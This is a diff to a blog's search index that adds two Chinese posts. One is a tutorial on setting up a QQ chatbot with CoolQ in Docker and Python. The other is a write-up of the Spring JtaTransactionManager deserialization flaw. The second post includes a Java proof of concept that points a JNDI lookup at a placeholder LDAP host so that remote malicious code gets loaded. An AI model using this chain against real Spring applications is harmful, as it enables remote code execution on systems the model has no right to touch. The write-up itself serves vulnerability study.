@@ -1,6 +1,140 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Python 定制QQ机器人</title>
+    <url>/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/</url>
+    <content><![CDATA[<p>前两天见有同学写QQ机器人用于每天代为疫情打卡，感觉是挺方便的，但有违学校规定，后被迫停止了，遂自己写了脚本挂服务器，然后感觉这个机器人挺有趣</p>
+<h2 id="安装酷Q-on-Docker"><a href="#安装酷Q-on-Docker" class="headerlink" title="安装酷Q on Docker"></a>安装酷Q on Docker</h2><p>酷Q原是Windows上的项目，不过官方基于Docker和Wine技术，也推出了酷Q Docker版，我只有台Ubuntu的VPS，自然就用Docker版了</p>
+<p>下载镜像</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull coolq/wine-coolq</span><br></pre></td></tr></table></figure>
+
+<p>下载后，在任意目录创建一个空文件夹，用于持久化存放 酷Q 数据</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir /root/coolq-data</span><br></pre></td></tr></table></figure>
+
+<p>运行 酷Q 镜像，后面要登录的QQ帐号和VNC密码自行设置</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name=coolq -d -p 8080:9000 -v /root/coolq-data:/home/user/coolq -e VNC_PASSWD=password -e COOLQ_ACCOUNT=username coolq/wine-coolq</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416161425000.png" alt="image-20200416161425000"></p>
+<p>访问vps服务所在端口，输入之前设置的密码</p>
+<p><img src="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416161955305.png" alt="image-20200416161955305"></p>
+<p>登录QQ小号，提示收到交互式网页验证码，但又看不见验证码，点拒绝，多尝试几次登录就OK了</p>
+<p><img src="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416170240449.png" alt="image-20200416170240449"></p>
+<h2 id="Python实现交互"><a href="#Python实现交互" class="headerlink" title="Python实现交互"></a>Python实现交互</h2><p>用到插件<a href="https://github.com/richardchien/coolq-http-api" target="_blank" rel="noopener">coolq-http-api</a>，其通过 HTTP 或 WebSocket 对酷 Q 的事件进行上报以及接收请求来调用酷 Q 的 DLL 接口，从而可以使用其它语言编写酷 Q 插件。支持 Windows 7 和 Windows Server 2008 及更新版本，也可以运行在 Wine、Docker</p>
+<p>还有<a href="https://github.com/cqmoe/python-cqhttp" target="_blank" rel="noopener">CQHTTP Python SDK</a>，其为 CQHTTP 插件的 Python SDK，封装了 web server 相关的代码，让使用 Python 的开发者能方便地开发插件</p>
+<h3 id="安装CoolQ-HTTP-API-插件"><a href="#安装CoolQ-HTTP-API-插件" class="headerlink" title="安装CoolQ HTTP API 插件"></a>安装CoolQ HTTP API 插件</h3><p>直接到 <a href="https://github.com/richardchien/coolq-http-api/releases" target="_blank" rel="noopener">Releases</a> 下载最新的 cpk 文件放到 酷Q 的 app 文件夹</p>
+<p><img src="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416171712785.png" alt="image-20200416171712785"></p>
+<p>重载应用后启用CQHTTP</p>
+<p><img src="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416171857757.png" alt="image-20200416171857757"></p>
+<p>然后讲道理这里应该会有日志回显的，但是没有，不明原因</p>
+<p><img src="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416172444861.png" alt="image-20200416172444861"></p>
+<p>那么直接在宿主机测试该插件是否生效</p>
+<p><img src="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416172633677.png" alt="image-20200416172633677"></p>
+<p>发现5700端口的确开放，说明插件已经正在运行了，测试下发送消息的api，user_id为QQ号</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">"http://172.17.0.2:5700/send_private_msg?user_id=1729888211&amp;message=test"</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416172746583.png" alt="image-20200416172746583"></p>
+<p><img src="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416172827678.png" alt="image-20200416172827678"></p>
+<p>能收到消息表明已经正常工作了</p>
+<p>目前能用http -api发送消息，还需要接收酷Q收到的消息才行，配置文件在 酷Q 的 <code>data\app\io.github.richardchien.coolqhttpapi\config</code> 文件夹中，文件名为 <code>&lt;user_id&gt;.json</code>（<code>&lt;user_id&gt;</code>为登录的 QQ 号）</p>
+<p><img src="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416174237085.png" alt="image-20200416174237085"></p>
+<p>酷Q 收到的消息、事件会被 POST 到配置文件中指定的 <code>post_url</code>，为空则不上报</p>
+<p>那么修改post_url，暂时我先设置为宿主机的内网ip，端口5701</p>
+<p><img src="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416175344285.png" alt="image-20200416175344285"></p>
+<p>重启下应用，宿主机监听5701端口，然后发给机器人一条消息</p>
+<p><img src="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416175853466.png" alt="image-20200416175853466"></p>
+<p><img src="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416175835683.png" alt="image-20200416175835683"></p>
+<p>5701端口收到POST传递过来的消息即说明功能正常</p>
+<p><img src="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416180327359.png" alt="image-20200416180327359"></p>
+<h3 id="CQHTTP-Python-SDK"><a href="#CQHTTP-Python-SDK" class="headerlink" title="CQHTTP Python SDK"></a>CQHTTP Python SDK</h3><p>我打算也安装在Docker中</p>
+<p><del>下载Python镜像</del></p>
+<p><del>docker pull python</del></p>
+<p>突然想起来 酷Q on Docker 中就有Python环境，那还是放在一起好了</p>
+<p>进入VNC右键桌面打开控制台</p>
+<p><img src="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416181040447.png" alt="image-20200416181040447"></p>
+<p>安装pip先</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/get-pip.py</span><br><span class="line">python3 get-pip.py</span><br></pre></td></tr></table></figure>
+
+<p>emm，报错</p>
+<p><img src="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416181945872.png" alt="image-20200416181945872"></p>
+<p>解决方法</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install python3-distutils</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416182110121.png" alt="image-20200416182110121"></p>
+<p>提示权限不够，可我也不知root的密码，那在宿主机进入docker并修改密码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -ti d6c bash</span><br><span class="line">passwd</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416182416295.png" alt="image-20200416182416295"></p>
+<p>进入VNC切换为root用户并安装python3-distutils，然后就可以安装pip了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">su root</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install python3-distutils</span><br><span class="line">python3 get-pip.py</span><br></pre></td></tr></table></figure>
+
+<p>接着直接用pip安装<code>cqhttp</code> 包</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -m pip install cqhttp</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后新建 Python 文件，运行 bot</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> cqhttp <span class="keyword">import</span> CQHttp</span><br><span class="line"></span><br><span class="line">bot = CQHttp(api_root=<span class="string">'http://127.0.0.1:5700/'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@bot.on_message</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_msg</span><span class="params">(event)</span>:</span></span><br><span class="line">    bot.send(event, <span class="string">'你好呀，下面一条是你刚刚发的：'</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">'reply'</span>: event[<span class="string">'message'</span>], <span class="string">'at_sender'</span>: <span class="literal">False</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@bot.on_notice('group_increase')  # 如果插件版本是 3.x，这里需要使用 @bot.on_event</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_group_increase</span><span class="params">(event)</span>:</span></span><br><span class="line">    bot.send(event, message=<span class="string">'欢迎新人～'</span>, auto_escape=<span class="literal">True</span>)  <span class="comment"># 发送欢迎新人</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@bot.on_request('group', 'friend')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_request</span><span class="params">(event)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">'approve'</span>: <span class="literal">True</span>&#125;  <span class="comment"># 同意所有加群、加好友请求</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bot.run(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">8080</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>之前已经将docker和宿主机的/root/coolq-data目录挂载了，python文件传到这里就可</p>
+<p><img src="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416184852576.png" alt="image-20200416184852576"></p>
+<p><img src="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416184842915.png" alt="image-20200416184842915"></p>
+<p>还要修改下CoolQ HTTP API 配置并重启应用</p>
+<p><img src="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416185325979.png" alt="image-20200416185325979"></p>
+<p>测试如下</p>
+<p><img src="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416185453205.png" alt="image-20200416185453205"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cqp.cc/t/34558" target="_blank" rel="noopener">酷Q on Docker 3.1</a></p>
+<p><a href="https://cqhttp.cc/docs/4.14/#/" target="_blank" rel="noopener">CoolQ HTTP API 插件</a></p>
+<p><a href="https://github.com/richardchien/coolq-http-api" target="_blank" rel="noopener">coolq-http-api</a></p>
+<p><a href="https://github.com/cqmoe/python-cqhttp" target="_blank" rel="noopener">python-cqhttp</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Spring JtaTransactionManager 反序列化漏洞</title>
+    <url>/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>该漏洞存在于spring-tx.jar包的org.springframework.transaction.jta.JtaTransactionManager类，该类实现了Java Transaction API，主要功能是处理分布式的事务管理，其重写了readObject方法，导致反序列化时该类时产生JNDI注入的问题从而RCE。但并不是spring最基本的包，默认不使用，所以并不是所有使用了spring框架的应用都受影响，需要具体检查是否包含了spring-tx.jar包</p>
+<a id="more"></a>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>通过maven下载相应的jar包即可</p>
+<p>pom.xml</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-tx<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.transaction<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jta<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>org.springframework.transaction.jta.JtaTransactionManager#readObject</p>
+<p><img src="/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103005813.png" alt="image-20200414103005813"></p>
+<p>org.springframework.transaction.jta.JtaTransactionManager#initUserTransactionAndTransactionManager</p>
+<p><img src="/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103027298.png" alt="image-20200414103027298"></p>
+<p>org.springframework.transaction.jta.JtaTransactionManager#lookupUserTransaction</p>
+<p><img src="/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103115405.png" alt="image-20200414103115405"></p>
+<p>当前代码是IDEA反编译得来的，下载源码后，该方法介绍为</p>
+<blockquote>
+<p>Look up the JTA UserTransaction in JNDI via the configured name.</p>
+</blockquote>
+<p><img src="/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103252512.png" alt="image-20200414103252512"></p>
+<p>继续跟进也会发现其实就是封装了JNDI的操作</p>
+<p>org.springframework.jndi.JndiTemplate#lookup(java.lang.String)</p>
+<p><img src="/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414104000058.png" alt="image-20200414104000058"></p>
+<p>org.springframework.jndi.JndiTemplate#createInitialContext</p>
+<p><img src="/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414104026444.png" alt="image-20200414104026444"></p>
+<p>而lookup的参数userTransactionName也是可控的，那么漏洞就很显然了</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先编译恶意类放于WEB服务中</p>
+<p><img src="/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414105118218.png" alt="image-20200414105118218"></p>
+<p>借助marshalsec启动ldap服务并设置恶意类地址</p>
+<p><img src="/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414105225641.png" alt="image-20200414105225641"></p>
+<p>最后模拟漏洞触发场景，构造恶意类并反序列化</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.transaction.jta.JtaTransactionManager;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        JtaTransactionManager jtaTransactionManager = <span class="keyword">new</span> JtaTransactionManager();</span><br><span class="line">        jtaTransactionManager.setUserTransactionName(<span class="string">"ldap://x.x.x.x:6666/xxx"</span>);</span><br><span class="line"></span><br><span class="line">        unserialize(serialize(jtaTransactionManager));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream btout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ByteArrayInputStream btin = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.open-open.com/news/view/1225d07" target="_blank" rel="noopener">Spring framework deserialization RCE漏洞分析以及利用</a></p>
+]]></content>
+      <tags>
+        <tag>Java</tag>
+        <tag>Spring</tag>
+        <tag>反序列化漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Java Web代码执行漏洞回显总结</title>
     <url>/2020/03/31/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<p>最近在学习几位师傅研究的Java Web代码执行漏洞下的回显方式，收获很多，能力有限，此文也没有什么新的思路，仅当个人学习笔记</p>
@@ -841,8 +975,8 @@
 ]]></content>
       <tags>
         <tag>Java</tag>
-        <tag>FastJson</tag>
         <tag>反序列化漏洞</tag>
+        <tag>FastJson</tag>
         <tag>JNDI注入</tag>
       </tags>
   </entry>
